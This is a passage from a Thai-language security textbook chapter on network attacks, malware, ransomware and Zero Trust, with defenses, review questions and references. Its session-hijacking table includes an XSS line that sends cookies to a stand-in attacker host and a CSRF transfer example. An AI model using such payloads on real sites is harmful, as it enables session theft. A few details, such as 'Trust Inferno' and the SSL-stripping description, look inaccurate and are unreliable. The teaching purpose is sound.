| **DAI (DHCP Snooping + ARP Inspection)** | Switch | ตรวจสอบ ARP — Trusted Ports (Uplink) vs Untrusted Ports (Access) |

### 5.2 DNS Poisoning (DNS Cache Poisoning)

**หลักการทำงาน:**
DNS Poisoning หรือ DNS Cache Poisoning คือการที่ผู้โจมตีส่ง DNS Response ปลอมไปยัง DNS Resolver (Recursive Resolver) เพื่อให้บันทึกข้อมูล DNS ที่ผิดพลาดลง Cache เมื่อผู้ใช้ Request Domain Name ที่ถูก Poison ไว้ ก็จะถูก Redirect ไปยัง IP Address ของผู้โจมตี

```
ปกติ:         ผู้ใช้ → DNS Resolver → Authoritative DNS → IP จริง
ถูก Poison:   ผู้ใช้ → DNS Resolver (Cache ผิด) → IP ปลอม (ผู้โจมตี)
```

**เทคนิคการโจมตี DNS:**

| เทคนิค | รายละเอียด | ความรุนแรง |
|--------|-----------|-----------|
| **DNS Cache Poisoning (Classic)** | ส่ง DNS Response ปลอมพร้อม Transaction ID ที่เดาถูก | ปานกลาง — Transaction ID มี 16-bit (65,536 ค่า) |
| **DNS Pharming** | เปลี่ยน DNS Setting บน Router หรือ Device ของเหยื่อ | สูง — ต้องเข้าถึง Device ได้ |
| **DNS Tunneling** | ใช้ DNS Queries/Responses เป็นช่องทาง C2 — ข้อมูลถูก Encoded ใน DNS Queries | ปานกลาง — Traffic ผิดปกติ |
| **DNS Amplification DDoS** | ใช้ Open DNS Resolver ส่ง Response ใหญ่ไปยัง Victim (Spoof Source IP) | สูงมาก — Amplification Factor สูงถึง 50x |

**การป้องกัน DNS Poisoning:**

| มาตรการ | คำอธิบาย |
|---------|----------|
| **DNSSEC (DNS Security Extensions)** | เพิ่ม Digital Signature ใน DNS Records — ตรวจสอบความถูกต้องของ Response — ป้องกัน Cache Poisoning ได้ |
| **DNS over HTTPS (DoH) / DNS over TLS (DoT)** | เข้ารหัส DNS Query — ป้องกันการดักจับและแก้ไขระหว่างทาง |
| **Random Transaction ID + Port** | ระบบปฏิบัติการสมัยใหม่ใช้ Source Port แบบสุ่ม — ทำให้การโจมตีแบบ Poison Cache ทำได้ยากขึ้น |
| **กำหนด TTL ที่เหมาะสม** | TTL สั้น = Cache Poisoning มีผลระยะเวลาสั้นลง |
| **Use Trusted DNS Resolvers** | ใช้ DNS Provider ที่มี Security ในตัว (Cloudflare 1.1.1.1, Google 8.8.8.8, Quad9 9.9.9.9) |

### 5.3 IP Spoofing

**หลักการทำงาน:**
IP Spoofing คือการที่ผู้โจมตีปลอมแปลง Source IP Address ใน IP Packet Header เพื่อให้ Packet นั้นดูเหมือนว่ามาจากแหล่งที่เชื่อถือได้ หรือจากแหล่งที่ตรวจสอบยาก

**ข้อจำกัด:** ผู้โจมตีไม่สามารถรับ Response ได้ (One-Way Communication) — เพราะ Response จะถูกส่งไปยัง IP ที่ปลอมมา ดังนั้น IP Spoofing จึงเหมาะกับ:
- **DDoS Amplification/Reflection** — ส่ง Request โดยใช้ Source IP = Victim → Response ไปที่ Victim
- **Blind Attack** — ผู้โจมตีไม่สนใจ Response (เช่น SYN Flood)

**การป้องกันตามมาตรฐาน BCP 38 (RFC 2827):**

| มาตรการ | ระดับ | คำอธิบาย |
|---------|------|----------|
| **Ingress Filtering** | Router/ISP | ตรวจสอบ Traffic ขาเข้า — ถ้า Source IP มาจาก Network ที่ไม่ควรจะผ่านจุดนี้ → Drop |
| **Egress Filtering** | Firewall | ตรวจสอบ Traffic ขาออกจากองค์กร — Source IP ต้องเป็น IP ขององค์กรเท่านั้น |
| **Unicast RPF (uRPF)** | Router | ตรวจสอบ Routing Table — ถ้าไม่มี Route กลับไปยัง Source IP → Drop |
| **IPsec Authentication Header** | End-to-End | ใช้ Authentication ระดับ Network Layer — พิสูจน์ Source IP |

**ตัวอย่าง: DDoS Amplification ผ่าน IP Spoofing**

```
ผู้โจมตี → ส่ง DNS Query ปลอม (Source = Victim IP) → Open DNS Resolver
                                                          ↓
Open DNS Resolver → ส่ง DNS Response (ขนาดใหญ่) → Victim IP (ไม่ใช่ผู้โจมตี)
```

**BCP 38 (RFC 2827) — Best Current Practice:** แนะนำให้ ISP ทุกรายทำ Ingress Filtering ที่ Customer Edge Router เพื่อปฏิเสธ Traffic ที่มี Source IP ไม่ตรงกับ Network Segment ของลูกค้า — แต่ปัจจุบัน ISP หลายรายยังไม่ได้ implement อย่างสมบูรณ์

### 5.4 การโจมตีแบบ Man-in-the-Middle (MITM)

**หลักการ:**
การโจมตี MITM คือสถานการณ์ที่ผู้โจมตีแทรกตัวอยู่ระหว่างผู้ส่งและผู้รับ (Alice และ Bob) โดยทั้งสองฝ่ายไม่รู้ตัว ผู้โจมตีสามารถ:
- **Eavesdropping** — ดักฟังข้อมูล (อ่านแต่ไม่แก้ไข)
- **Modification** — ดัดแปลงข้อมูลก่อนส่งต่อ
- **Impersonation** — แอบอ้างตัวตนเป็นอีกฝ่าย

**วิธีการโจมตี MITM ที่สำคัญ:**

| วิธีการ | รายละเอียด | การป้องกัน |
|--------|-----------|-----------|
| **ARP Spoofing** | หลอก Switch ให้ส่ง Traffic มาที่ผู้โจมตี (LAN) | DAI, Port Security, Static ARP |
| **DNS Spoofing** | ส่ง DNS Response ปลอม — Redirect ผู้ใช้ | DNSSEC, DoH/DoT |
| **SSL Stripping** | Downgrade HTTPS → HTTP — ผู้ใช้เห็น HTTPS ใน URL bar แต่จริงๆ เป็น HTTP | HSTS Preloading, HTTP → HTTPS Redirect |
| **Rogue Access Point** | ตั้ง Access Point ปลอมที่มี SSID เดียวกัน | 802.1X, WPA3-Enterprise, Certificate Pinning |
| **Session Hijacking** | ขโมย Session Cookie หลัง Authentication | Secure + HttpOnly Cookies, SameSite=Lax/Strict |
| **mTLS Proxy** | Proxy Certificate (Corporate SSL Inspection) | Certificate Pinning, Public Key Pinning (HPKP) — ใช้ด้วยความระมัดระวัง |
| **Evil Twin Wi-Fi** | AP ปลอมที่มี SSID ซ้ำกับ AP จริง — หลอกให้ Client เชื่อมต่อ | WPA3-Enterprise, ตรวจสอบ Certificate |
| **Proxy Attack** | ผู้โจมตีตั้ง Proxy Server และ Config Browser ให้ใช้ | PAC File Security, WPAD Hardening |

**เครื่องมือสำหรับ MITM Attack:**

| เครื่องมือ | คุณสมบัติเด่น |
|-----------|-------------|
| **Bettercap** | รองรับ HTTP/HTTPS/DNS MITM, 802.11 (Wi-Fi), BLE (Bluetooth Low Energy) — ครบเครื่องที่สุดในปัจจุบัน |
| **Ettercap** | ARP Spoofing, Content Filtering, Password Sniffing — Classic Tool |
| **mitmproxy** | HTTPS Proxy สำหรับวิเคราะห์ Traffic — ใช้ในการทดสอบความปลอดภัยของ Web App |
| **Responder** | LLMNR/NBT-NS/mDNS Poisoning — ขโมย Credentials ในเครือข่าย Windows |
| **Evilginx2** | Reverse Proxy สำหรับ Phishing — ขโมย Session Cookies แบบ Real-Time (Bypass MFA) |

**การป้องกัน MITM อย่างครบวงจร:**

| ชั้น | มาตรการ |
|------|---------|
| **Network** | DAI (Dynamic ARP Inspection), DHCP Snooping, Port Security, 802.1X |
| **Transport** | TLS 1.3, HSTS (HTTP Strict Transport Security), Certificate Pinning |
| **Application** | Secure + HttpOnly Cookies, SameSite Cookies, CSP (Content Security Policy) |
| **Authentication** | MFA — โดยเฉพาะ FIDO2/WebAuthn ที่ทนต่อ Phishing |
| **User Awareness** | ตรวจสอบ URL, Certificate, ไม่คลิกลิงก์ต้องสงสัย |

### 5.5 Session Hijacking

**หลักการ:**
Session Hijacking คือการที่ผู้โจมตีขโมย Session Identifier (Session Token, Session ID, Cookie) ของเหยื่อที่ผ่าน Authentication แล้ว เพื่อใช้เข้าถึงระบบโดยไม่ต้อง Login

**วิธีการขโมย Session:**

| วิธีการ | คำอธิบาย | ตัวอย่าง |
|--------|----------|---------|
| **Session Side-Jacking** | ดักจับ Session Cookie ที่ส่งผ่าน HTTP ไม่เข้ารหัส | Sniff Traffic ผ่าน Wi-Fi สาธารณะ |
| **Cross-Site Scripting (XSS)** | รัน JavaScript เพื่ออ่าน Document.cookie | `<script>fetch('evil.com/?c='+document.cookie)</script>` |
| **CSRF (Session Riding)** | ใช้ Session ที่มีอยู่เพื่อส่ง Request โดยไม่ยินยอม | `<img src="bank.com/transfer?to=attacker&amount=10000">` |
| **Session Fixation** | บังคับให้เหยื่อใช้ Session ID ที่ผู้โจมตีรู้ | ส่ง Link ที่มี Session ID กำหนดไว้ล่วงหน้า |
| **Token Theft via Malware** | ขโมย Token File หรือ Registry | ขโมย OAuth Token จาก Local Storage |

**มาตรการป้องกัน Session Hijacking:**

| มาตรการ | คำอธิบาย |
|---------|----------|
| **HttpOnly Cookie** | JavaScript ไม่สามารถอ่าน Cookie ได้ — ป้องกัน XSS-based Session Theft |
| **Secure Cookie** | Cookie ถูกส่งผ่าน HTTPS เท่านั้น |
| **SameSite Cookie** | Lax = ป้องกัน CSRF (Cross-Site Request Forgery) บางส่วน; Strict = ป้องกันทั้งหมด |
| **Session Timeout** | กำหนดอายุ Session (15-30 นาที Idle Timeout) |
| **IP/Device Binding** | ผูก Session กับ IP Address หรือ Device Fingerprint |
| **Token Rotation** | สร้าง Token ใหม่ทุกครั้งที่ใช้ — Token เก่าถูกยกเลิก |
| **MFA Re-authentication** | สอบถาม MFA อีกครั้งเมื่อทำ Transaction สำคัญ |

---

## 6. Malware และ Ransomware Ecosystem

### 6.1 การจำแนกประเภทของ Malware

| ประเภท | ลักษณะสำคัญ | การแพร่กระจาย | Dwell Time | ตัวอย่างในประวัติศาสตร์ |
|--------|------------|--------------|-----------|----------------------|
| **Virus** | แนบตัวเองกับไฟล์ — ต้องอาศัยการเปิดไฟล์เพื่อทำงาน | ไฟล์ที่ติดเชื้อ, USB | ระยะสั้น | CIH (Chernobyl), Melissa, ILOVEYOU |
| **Worm** | แพร่กระจายตัวเองผ่านเครือข่าย — ไม่ต้องมีไฟล์โฮสต์ | Network Vulnerability, Email | ระยะสั้น (แพร่เร็วมาก) | Conficker, Morris, WannaCry (worm + ransomware) |
| **Trojan** | ปลอมตัวเป็นซอฟต์แวร์ปกติ — ผู้ใช้ Download เอง | การหลอกให้ Download | ขึ้นอยู่กับเป้าหมาย | Emotet, Zeus, QakBot |
| **Ransomware** | เข้ารหัสไฟล์ + เรียกค่าไถ่ — มีทั้ง Encryptor และ Locker | Email, RDP, Vulnerability, Drive-By | จากชั่วโมงถึงวัน | WannaCry, LockBit, BlackCat, DarkSide |
| **Botnet** | ควบคุมเครื่องเหยื่อระยะไกล — ใช้โจมตี DDoS หรือส่ง Spam | Worm, Trojan, Exploit | ระยะยาว | Mirai, Emotet, TrickBot |
| **Rootkit** | ซ่อนตัวใน OS — แก้ไข Kernel หรือ Boot Process | Exploit, Trojan | ระยะยาวมาก | Sony Rootkit (2005), ZeroAccess |
| **Spyware** | จารกรรมข้อมูล — บันทึกการใช้งาน, ถ่ายภาพ, อัดเสียง | Bundle กับ Freeware, Drive-By | ระยะยาว | Pegasus (NSO Group), FinFisher |
| **Keylogger** | บันทึกการพิมพ์ — ขโมย Password, Credit Card | Trojan, Drive-By Download | ระยะสั้น-กลาง | |
| **Fileless Malware** | ทำงานใน Memory — ไม่มีไฟล์บน Disk — ตรวจจับยากมาก | PowerShell, WMI, Macros | สั้น (ไม่มีร่องรอย) | Kovter, Astaroth |
| **Adware** | แสดงโฆษณา — สร้างรายได้จากผู้ใช้ | Bundle กับ Freeware | ระยะยาว | |

### 6.2 วงจรชีวิตของ Malware (Malware Lifecycle)

```
1. Delivery ──→ 2. Installation ──→ 3. Execution ──→ 4. Persistence ──→ 5. C2 ──→ 6. Action
    │                  │                 │                │              │          │
    ▼                  ▼                 ▼                ▼              ▼          ▼
  Phishing          Exploit          Decode /        Registry       DNS/Tor    Encrypt
  USB Drop       Social Eng.       Deobfuscate    Scheduled Task   HTTPS      Exfiltrate
  Drive-By                            Load Payload   Service        P2P        Destroy
```

| ขั้นตอน | คำอธิบาย | ตัวอย่าง |
|---------|----------|---------|
| **1. Delivery** | ส่ง Malware ไปยังเหยื่อ | Email Attachment (Phishing), USB Drop, Drive-By Download, Watering Hole |
| **2. Installation** | ติดตั้งในระบบ — ใช้ Exploit หรือ Social Engineering | CVE Exploit, User Double-Click, Macro Execution |
| **3. Execution** | ทำงานตามวัตถุประสงค์ | PowerShell Script, DLL Injection, Shellcode Execution |
| **4. Persistence** | ทำให้ Malware สามารถอยู่รอดได้แม้จะมีการ Restart ระบบ | Registry Run Key, Scheduled Task, Windows Service |
| **5. Command & Control (C2)** | ติดต่อกับเซิร์ฟเวอร์ควบคุม | DNS Beaconing (Mirai), HTTPS C2 (Cobalt Strike), DGA (SolarWinds) |
| **6. Actions on Objectives** | ดำเนินการตามเป้าหมาย | Keylogging, สแกนเครือข่าย, เรียกค่าไถ่, ขโมยข้อมูล |

### 6.3 Malware Delivery Mechanisms (วิธีการส่ง Malware)

| วิธีการ | คำอธิบาย | สัดส่วนการใช้งาน |
|--------|----------|-----------------|
| **Phishing Email** | ส่งอีเมลพร้อม Attachment Malicious หรือ Link ไปยัง Fake Login Page | ~60% (ENISA 2025) |
| **Drive-By Download** | ผู้ใช้เข้าเว็บไซต์ที่มี Exploit Kit — Malware ถูก Download โดยอัตโนมัติ | ~15% |
| **Malicious USB** | ทิ้ง USB Drive ที่ติด Malware ไว้ในที่จอดรถ / หน้าองค์กร | ~3% |
| **Watering Hole** | แทรก Malware ในเว็บไซต์ที่เป้าหมายเข้าเป็นประจำ | <1% (Targeted Attack) |
| **Supply Chain** | แทรก Malware ใน Software Update หรือ Library | <1% แต่รุนแรงที่สุด (SolarWinds 18,000 ราย) |
| **RDP/VPN Brute-Force** | แฮก Remote Access Services | ~15% (สำหรับ Ransomware) |

### 6.4 Ransomware Ecosystem (เจาะลึก)

Ransomware เป็นภัยคุกคามที่ร้ายแรงที่สุดในปัจจุบัน:

**ประเภทของ Ransomware:**

| ประเภท | คำอธิบาย | ตัวอย่าง |
|--------|----------|---------|
| **Encryptor (Crypto Ransomware)** | เข้ารหัสไฟล์ — ต้องใช้ Key ในการถอดรหัส | LockBit, BlackCat, DarkSide |
| **Locker Ransomware** | ล็อกหน้าจอ — ไม่ให้เข้า OS (ไม่ได้เข้ารหัสไฟล์) | WinLocker, FBI MoneyPak |
| **Double Extortion** | เข้ารหัสไฟล์ + **ขโมยข้อมูล** — ถ้าไม่จ่ายจะเผยแพร่ข้อมูลสู่สาธารณะ | DarkSide, REvil, Clop |
| **Triple Extortion** | Double Extortion + **DDoS** หรือแจ้งลูกค้า/คู่ค้า | Maze, REvil |
| **Ransomware-as-a-Service (RaaS)** | แพลตฟอร์มที่ให้ Affiliate เช่าใช้ | LockBit, BlackCat (ALPHV), REvil |

**Ransomware Attack Timeline (ทั่วไป):**

```
1. Initial Access ──→ 2. Persistence ──→ 3. Recon ──→ 4. Lateral ──→ 5. Exfil ──→ 6. Deploy ──→ 7. Ransom
  (ผ่าน VPN,          (สร้าง         (สแกน          Movement         (ขโมย         (เข้ารหัส       (เรียกค่าไถ่)
   RDP, Phishing)    Backdoor)      Network)        ไปยัง Servers)    ข้อมูล)        Production)
```

| ขั้นตอน | ระยะเวลา (ทั่วไป) | รายละเอียด |
|---------|------------------|-----------|
| **Initial Access** | ชั่วโมงถึงวัน | VPN/RDP Brute-Force, Phishing, Vulnerability Exploit |
| **Persistence + Recon** | วันถึงสัปดาห์ | สร้าง User/Local Admin, สแกน Network, Mapping AD |
| **Lateral Movement** | วันถึงสัปดาห์ | ใช้ RDP/PSExec/WMI แพร่กระจายไปยัง Servers |
| **Data Exfiltration** | ชั่วโมงถึงวัน | ขโมยข้อมูลสำคัญ — ใช้ RClone, 7z + FTP/S3 |
| **Deploy Ransomware** | นาทีถึงชั่วโมง | มักเริ่มในเวลากลางคืนหรือวันหยุด — สูงสุดของผลกระทบ |
| **Ransom Note** | Real-Time | เรียกค่าไถ่ — ปกติ 1-10 ล้าน USD |

**สถิติ Ransomware ที่สำคัญ:**
- **Median Ransom Demand**: 1.20 ล้าน USD (Sophos 2025)
- **Median Ransom Paid**: 1.0 ล้าน USD (Sophos 2025)
- **Payment Rate**: 25% — All-Time Low (Coveware Q4 2024)
- **Ransomware in Breaches**: 44% (Verizon DBIR 2025 — เพิ่มขึ้น 37% YoY)
- **SMB Ransomware**: 88% ของ SMB Breaches เกี่ยวข้องกับ Ransomware (Verizon DBIR 2025)

---

## 7. Zero Trust Architecture (ZTA)

### 7.1 แนวคิดหลัก

Zero Trust Architecture เป็นแนวคิดด้านความปลอดภัยที่เปลี่ยนกระบวนทัศน์จากการป้องกันที่ Perimeter (Castle-and-Moat) ไปสู่การตรวจสอบทุกการเข้าถึงโดยไม่เชื่อถือสิ่งใดโดยปริยาย — **"Never Trust, Always Verify"**

**ที่มา:** แนวคิด Zero Trust ถูกเสนอครั้งแรกโดย John Kindervag (Forrester Research) ในปี 2010 และได้รับการพัฒนาต่อเป็นมาตรฐาน **NIST SP 800-207** ในปี 2020

### 7.2 7 Tenets ของ Zero Trust (NIST SP 800-207)

| # | Tenet | คำอธิบาย |
|---|-------|----------|
| 1 | **All data sources and computing services are resources** | ทุกอย่างคือ Resource — รวมถึง Cloud Services, SaaS, IoT Devices, และ Personal Devices |
| 2 | **All communication is secured regardless of network location** | ทุกการสื่อสารต้องปลอดภัย — ไม่ว่าจะอยู่ในเครือข่ายองค์กรหรือนอกเครือข่าย |
| 3 | **Access to resources is granted on a per-session basis** | การเข้าถึงทรัพยากรต้องได้รับอนุมัติ **ทุก Session** — ไม่ใช่ครั้งแรกแล้วใช้ตลอดไป |
| 4 | **Access is determined by dynamic policy** | นโยบายการเข้าถึงต้องคิดจากหลายปัจจัย — User Identity, Device Health, Location, Data Sensitivity, Request Time |
| 5 | **The enterprise monitors all owned assets** | องค์กรต้องติดตาม Security Posture ของ Asset ทั้งหมด — อุปกรณ์ทุกชิ้นต้องถูก Monitor |
| 6 | **All resource authentication and authorization is dynamic and strictly enforced** | Authentication + Authorization ต้องมี Dynamic และเข้มงวด ทุกครั้งก่อนเข้าถึง |
| 7 | **The enterprise collects as much information as possible** | เก็บข้อมูลเกี่ยวกับ Network, Assets, และ Communications — ใช้ปรับปรุง Security |

### 7.3 องค์ประกอบของ Zero Trust Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                    Control Plane                             │
│  ┌─────────────┐  ┌──────────────┐  ┌──────────────────┐   │
│  │ Policy      │  │ Policy       │  │ Policy           │   │
│  │ Engine (PE) │  │ Administrator│  │ Enforcement Point│   │
│  │ (ตัดสินใจ)   │  │ (สร้าง/ลบ    │  │ (PEP)            │   │
│  │             │  │  Session)    │  │ (บังคับใช้ Policy)│   │
│  └──────┬──────┘  └──────┬───────┘  └────────┬─────────┘   │
│         │               │                    │             │
└─────────┼───────────────┼────────────────────┼─────────────┘
          │               │                    │
          ▼               ▼                    ▼
┌─────────────────────────────────────────────────────────────┐
│                     Data Plane                               │
│  ┌──────────────────────────────────────────────────────┐   │
│  │  Subject (User/Device) ══════ PEP ══════> Resource   │   │
│  │           (ผ่าน Policy ก่อนถึง Resource)              │   │
│  └──────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────┘
```

| องค์ประกอบ | หน้าที่ | ตัวอย่าง |
|-----------|--------|---------|
| **Policy Engine (PE)** | ตัดสินใจว่าอนุญาตหรือปฏิเสธการเข้าถึง — ใช้ Policy + Context + Threat Intel | "User X จาก Device Y ที่ Location Z ต้องการเข้าถึง Resource A — อนุญาตหรือไม่?" |
| **Policy Administrator (PA)** | สร้าง/ยกเลิก Session การเข้าถึง — สร้าง Authentication Token | สร้าง JWT, เรียก PEP ให้เปิด/ปิด Pathway |
| **Policy Enforcement Point (PEP)** | จุดบังคับใช้นโยบาย — อยู่ระหว่าง Subject และ Resource | Gateway, Reverse Proxy, VPN Concentrator, Network FW |
| **Control Plane** | เส้นทางควบคุม — PE + PA + PEP ติดต่อกันผ่าน Control Plane | API Calls, Policy Distribution |
| **Data Plane** | เส้นทางข้อมูล — เมื่อ PEP อนุญาตแล้ว Subject ↔ Resource | Encrypted Tunnel หรือ Direct Connection |

### 7.4 Zero Trust vs Perimeter-based Security

| มิติ | Perimeter-based (Castle-and-Moat) | Zero Trust |
|-----|-----------------------------------|-----------|
| **แนวคิดหลัก** | "เชื่อถือสิ่งที่อยู่ในเครือข่าย" | "ไม่เชื่อถืออะไรเลย — ตรวจสอบทุกครั้ง" |
| **การเข้าถึง** | เข้าเครือข่ายได้ = เข้าถึงทรัพยากรได้เกือบทั้งหมด | ต้องตรวจสอบทุก Resource Request แยกกัน |
| **การแบ่งส่วนเครือข่าย** | VLAN Segmentation ระดับกว้าง | **Microsegmentation** — Per-Workload หรือ Per-Device |
| **การตรวจสอบ** | ที่ Perimeter (Firewall) เป็นหลัก | **ทุกจุด** — Network, Endpoint, Application, Data |
| **นโยบาย** | IP-based, Port-based — Static | Identity-based, Device-based, Context-based — **Dynamic** |
| **Remote Access** | VPN — เข้าเครือข่ายทั้งหมด | ZTNA — เข้าถึงแค่ Resource ที่ได้รับอนุญาต |
| **Default Action** | Deny at Perimeter, Allow Inside | **Deny All** — ทุกที่ ทุกเวลา |
| **การตอบสนองเมื่อถูกบุกรุก** | ตรวจจับและไล่ออก — แต่ Lateral Movement ง่าย | Assume Breach — จำกัดความเสียหายทันที |

### 7.5 CISA Zero Trust Maturity Model (v2.0, 2023)

CISA (Cybersecurity and Infrastructure Security Agency) แบ่ง Zero Trust Maturity ออกเป็น 3 ระดับ ใน 5 Pillars:

| Pillar | Traditional (ดั้งเดิม) | Advanced (ก้าวหน้า) | Optimal (เหมาะสมที่สุด) |
|--------|----------------------|-------------------|---------------------|
| **Identity** | On-Prem AD, Password-based | MFA + Conditional Access | Continuous Authentication + Risk-Based |
| **Devices** | IT-managed devices only | MDM/UEM + Compliance Checking | Real-Time Health Monitoring + Zero Trust Enforcement |
| **Networks** | VLANs + Perimeter Firewall | Microsegmentation + Traffic Encryption | Fully Distributed + AI-based Threat Detection |
| **Applications/Workloads** | On-Prem, VPN Access | Cloud Hybrid, WAF, API Security | Serverless, CICD Security, Runtime Protection |
| **Data** | Basic Classification | DLP + Encryption at Rest/In Transit | Data-Centric Security + Automated Classification |

### 7.6 Google BeyondCorp — กรณีศึกษา Zero Trust จริง

**BeyondCorp** คือการนำ Zero Trust มาใช้จริงใน Google (2011 — ก่อน Zero Trust จะเป็น Trend):

| หลักการ BeyondCorp | รายละเอียด |
|-------------------|-----------|
| **No VPN** | ยกเลิก VPN — พนักงานเข้าถึง Resource ผ่าน Internet โดยตรง แต่ต้องตรวจสอบ Identity + Device |
| **Device Inventory** | ทุกอุปกรณ์ต้องอยู่ใน Inventory — ตรวจสอบ Health, OS Version, Patch Level |
| **Access Proxy** | Request ผ่าน Access Proxy ก่อนถึง Resource — Proxy ตรวจสอบ Policy |
| **Trust Inferno** | ไม่เชื่อถืออะไร — Trust ต้องถูกสร้างใหม่ทุกครั้ง |

**ผลลัพธ์ของ BeyondCorp ใน Google:**
- พนักงาน 100,000+ คน ทำงานจากทุกที่ในโลก — ไม่ต้องใช้ VPN
- Access Control ละเอียดระดับ Application — ไม่ใช่ระดับ Network
- ลดความเสี่ยงจาก Compromised Credentials — Device Health มาช่วยอีกชั้น

---

## 8. การป้องกันเชิงลึกและการอยู่รอดของเครือข่าย

### 8.1 Defense in Depth สำหรับการป้องกันการโจมตี

การป้องกันเครือข่ายจากการโจมตีต้องใช้หลักการ Defense in Depth (การป้องกันเชิงลึก) — ไม่มีมาตรการป้องกันชั้นเดียวที่เพียงพอ:

| Layer | มาตรการ | ป้องกันการโจมตีใด |
|-------|---------|------------------|
| **1 — Policy & Governance** | Security Policy, Risk Assessment, Incident Response Plan | ทุกประเภท — กำหนดแนวทาง |
| **2 — Physical Security** | Data Center Access Control, CCTV, Locks | Physical Access Attacks |
| **3 — Network Perimeter** | Firewall, DDoS Protection, WAF | DDoS, Port Scanning, Web Attacks |
| **4 — Network Internal** | IDS/IPS, Network Segmentation, NAC | ARP Spoofing, MITM, Lateral Movement |
| **5 — Endpoint** | EDR, Anti-Malware, HIPS, Hardening | Malware, Ransomware, Fileless Attacks |
| **6 — Application** | Secure Coding, SAST/DAST, WAF | XSS, SQL Injection, CSRF |
| **7 — Data** | Encryption, DLP, Access Control | Data Leakage, Unauthorized Access |
| **8 — Identity** | MFA, IAM, Least Privilege | Credential Theft, Privilege Escalation |
| **9 — Monitoring** | SIEM, SOAR, SOC 24/7 | All — Detection and Response |
| **10 — Recovery** | Backup, DR, BCP | Ransomware, Data Loss |

---

## 9. สรุปท้ายบท (Chapter Summary)

### 9.1 หลักการสำคัญ

| หัวข้อ | สรุป |
|-------|------|
| **Threat Actors** | 6 ประเภทหลัก — Nation-State (APT), Cyber Criminal, Hacktivist, Insider, Script Kiddie, Organized Crime — แต่ละประเภทมีแรงจูงใจ เป้าหมาย และความสามารถที่แตกต่างกัน |
| **Attack Surface** | จุดรวมของช่องทางที่ผู้โจมตีสามารถใช้ได้ — การลด Attack Surface เป็นแนวทางสำคัญด้วย Minimal Service, Least Privilege, Segmentation, Patch Management, Hardening |
| **Cyber Kill Chain** | 7 ขั้นตอน: Recon → Weaponize → Deliver → Exploit → Install → C2 → Actions — Unified Kill Chain ขยายเป็น 18 ขั้นตอน 3 ระยะ |
| **Diamond Model** | วิเคราะห์ 4 มุม: Adversary, Capability, Infrastructure, Victim — บวก Social-Political และ Technology |
| **Threat Modeling** | STRIDE (จำแนกภัย), DREAD (จัดลำดับ — deprecated), PASTA (7 ขั้นตอนละเอียด), MITRE ATT&CK (14 Tactics, หลายร้อย Techniques) |
| **Network Layer Attacks** | ARP Spoofing → DAI; DNS Poisoning → DNSSEC; IP Spoofing → BCP 38; MITM → Encryption + Authentication; Session Hijacking → Secure Cookies |
| **Malware** | 10+ ประเภท — Virus, Worm, Trojan, Ransomware, Botnet, Rootkit, Spyware, Keylogger, Fileless, Adware — Ransomware เป็นภัยคุกคามที่ร้ายแรงที่สุดในปัจจุบัน |
| **Zero Trust** | "Never Trust, Always Verify" — 7 Tenets ตาม NIST SP 800-207 — เปรียบเทียบกับ Perimeter-Based Security — CISA 5 Pillars Maturity Model — Google BeyondCorp |

### 9.2 ตัวเลขสำคัญที่ควรจำ

| ตัวเลข | ความหมาย |
|--------|----------|
| **4.92 ล้าน USD** | ค่าเสียหายเฉลี่ยจาก Insider Threat — สูงที่สุด (IBM 2025) |
| **44%** | สัดส่วน Ransomware ใน Breaches ทั้งหมด (Verizon DBIR 2025) |
| **60%** | Breaches ที่เกี่ยวข้องกับ Human Element |
| **14** | จำนวน Tactics ใน MITRE ATT&CK Enterprise |
| **7** | ขั้นตอนของ Cyber Kill Chain (Lockheed Martin) |
| **7** | Tenets ของ Zero Trust (NIST SP 800-207) |
| **5** | Pillars ของ CISA Zero Trust Maturity Model |
| **22%** | Edge Device/VPN Attacks เพิ่มขึ้น 8 เท่า (Verizon DBIR 2025) |

---

## คำถามทบทวน (Review Questions)

1. จงยกตัวอย่าง Threat Actors 4 ประเภท พร้อมอธิบายแรงจูงใจ เป้าหมาย และระดับความสามารถ — และยกตัวอย่างกลุ่ม APT ที่สำคัญอย่างน้อย 2 กลุ่ม
2. จงเปรียบเทียบ Cyber Kill Chain (Lockheed Martin) กับ Unified Kill Chain — แตกต่างกันอย่างไร? ข้อจำกัดของ Cyber Kill Chain คืออะไร?
3. อธิบายความแตกต่างระหว่าง STRIDE, PASTA และ MITRE ATT&CK ในการทำ Threat Modeling — Framework ใดเหมาะกับสถานการณ์ใด?
4. ARP Spoofing ทำงานอย่างไร? จงอธิบายขั้นตอน ผลกระทบ และมาตรการป้องกันทุกระดับ (Network → Application)
5. DNS Poisoning มีเทคนิคอะไรบ้าง? DNSSEC, DoH และ DoT ช่วยป้องกันอย่างไร?
6. จงอธิบายวงจรชีวิตของ Ransomware ตั้งแต่ Initial Access ไปจนถึง Ransom Note — รวมถึงประเภทต่างๆ (Double Extortion, Triple Extortion, RaaS)
7. Zero Trust Architecture แตกต่างจาก Perimeter-based Security อย่างไร? จงอธิบาย 7 Tenets ตาม NIST SP 800-207
8. CISA Zero Trust Maturity Model มีกี่ Pillars? อะไรบ้าง? และแต่ละ Pillar มี Maturity Level อย่างไร?
9. จงวิเคราะห์การโจมตี SolarWinds โดยใช้กรอบ Cyber Kill Chain — ขั้นตอนใดบ้างที่ SolarWinds ไม่สามารถตรวจจับหรือป้องกันได้?
10. Diamond Model of Intrusion Analysis มีกี่องค์ประกอบ? จงยกตัวอย่างการประยุกต์ใช้กับกรณี Colonial Pipeline

---

## เอกสารอ้างอิง (References)

### มาตรฐานและกรอบการทำงาน
1. MITRE. (2024). *MITRE ATT&CK Framework v14*. https://attack.mitre.org/
2. NIST SP 800-207. (2020). *Zero Trust Architecture*.
3. NIST SP 800-30 Rev. 1. (2012). *Guide for Conducting Risk Assessments*.
4. Lockheed Martin. (2011). *Intelligence-Driven Computer Network Defense Informed by Analysis of Adversary Campaigns and Intrusion Kill Chains*.
5. CISA. (2023). *Zero Trust Maturity Model v2.0*.
6. Kindervag, J. (2010). *Build Security Into Your Network's DNA: The Zero Trust Model of Information Security*. Forrester Research.
7. Pols, P. (2017). *The Unified Kill Chain*.
8. Caltagirone, S., et al. (2013). *The Diamond Model of Intrusion Analysis*.
9. OWASP. (2024). *Threat Modeling Cheat Sheet*.

### ตำราหลัก
10. Stallings, W. (2022). *Cryptography and Network Security: Principles and Practice* (8th ed.). Pearson.
11. Whitman, M. E., & Mattord, H. J. (2021). *Principles of Information Security* (7th ed.). Cengage Learning.
12. Howard, M., & Lipner, S. (2006). *The Security Development Lifecycle*. Microsoft Press.
